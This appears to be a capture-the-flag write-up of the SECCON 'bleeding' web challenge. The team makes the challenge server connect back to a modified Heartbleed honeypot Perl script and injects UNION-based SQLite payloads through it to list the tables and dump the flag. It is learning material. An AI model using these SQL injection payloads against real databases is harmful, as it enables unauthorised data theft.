This one was a really fun challenge! 

We solved it very quickly with my teammate [XeR](https://twitter.com/XeR_0x2A).

We were given this [http://bleeding.pwn.seccon.jp/](http://bleeding.pwn.seccon.jp/)

![alt text](http://saxx.swordarmor.fr/CTF/web300_heartbleed.png "Web Interface")

After a quick investigation, we figured out that it was a [sqli injection](https://www.owasp.org/index.php/SQL_Injection). 
If we made a correct request, there was some response back from the server which was echoed through a html comment.

```html
<!-- DEBUG: INSERT OK. TIME=1417995590 -->
```

Because this chall was relative to [the famous Heartbleed vuln](http://heartbleed.com/), we downloaded this [honeypot perl script](http://packetstormsecurity.com/files/126068/Heartbleed-Honeypot-Script.html).
Then, we made some modifications and then launched it with:

```bash
$ perl heartbleed_honeypot_web300.pl 
```

After those modifications, we made a request to [http://bleeding.pwn.seccon.jp/?ip=OUR_IP&port=31337](http://bleeding.pwn.seccon.jp/?ip=OUR_IP&port=31337)

Once, again we figured out quickly that it's was an [unband sqli injection or union sqli based](http://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/).
And that we were dealing with a [sqlite database](http://www.sqlite.org/).

**NOTA: In my opinion, there's no much and some good sqlite cheatsheets dealing to sqlite injection. I'll probably make one if I've some time.**

Ok, so in order to grab the flag, we've change respectively in the perl script the **$taunt** param by these following payloads:

```perl
my $taunt = "-1' UNION SELECT sqlite_version() /*"; 
```

```html
<!-- DEBUG: INSERT OK. TIME=3.6.20 -->
```

```perl
my $taunt = "-1' union  group_concat(name) FROM sqlite_master WHERE type='table' /*";
```

```html
<!-- DEBUG: INSERT OK. TIME=results,ssFLGss,ttDMYtt -->
```

```perl
my $taunt = "-1' union select group_concat(sql) FROM sqlite_master /*";
```

```html
<!-- DEBUG: INSERT OK. TIME=CREATE TABLE results ( time, host, result ),CREATE TABLE ssFLGss ( flag ),CREATE TABLE ttDMYtt ( dummy ) -->
```

```perl
my $taunt = "-1' union select flag FROM ssFLGss /*";
```

```html
<!-- DEBUG: INSERT OK. TIME=SECCON{IknewIt!SQLiteAgain!!!} -->
```

Have fun :)
